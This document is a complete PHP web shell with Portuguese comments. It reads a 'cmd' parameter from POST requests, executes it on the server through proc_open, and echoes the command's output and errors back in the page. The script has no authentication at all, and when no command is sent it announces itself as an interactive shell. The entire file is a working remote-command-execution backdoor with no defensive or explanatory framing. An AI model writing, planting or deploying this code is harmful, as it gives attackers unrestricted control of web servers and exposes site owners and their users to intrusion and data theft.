<?php
// Verifica se o parâmetro 'cmd' foi enviado via POST
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];

    // Se a função proc_open não estiver desabilitada
    if (function_exists('proc_open')) {
        // Descritores de entrada, saída e erro
        $descriptorspec = array(
            0 => array("pipe", "r"),  // stdin
            1 => array("pipe", "w"),  // stdout
            2 => array("pipe", "w")   // stderr
        );

        // Usando proc_open para rodar o comando
        $process = proc_open($cmd, $descriptorspec, $pipes);

        if (is_resource($process)) {
            // Captura a saída do comando (stdout)
            $output = stream_get_contents($pipes[1]);

            // Captura erros, se houver (stderr)
            $error = stream_get_contents($pipes[2]);

            // Fecha os pipes
            fclose($pipes[0]);
            fclose($pipes[1]);
            fclose($pipes[2]);

            // Fecha o processo
            proc_close($process);

            // Exibe a saída do comando ou erro
            echo "<pre>$output</pre>";
            if ($error) {
                echo "<pre>Error: $error</pre>";
            }
        } else {
            echo "Erro ao executar o comando.";
        }
    } else {
        echo "A função proc_open não está disponível.";
    }
} else {
    // Caso o parâmetro 'cmd' não tenha sido enviado, mostra uma mensagem
    echo "Shell interativa. Envie um comando via POST usando o parâmetro 'cmd'.";
}
?>
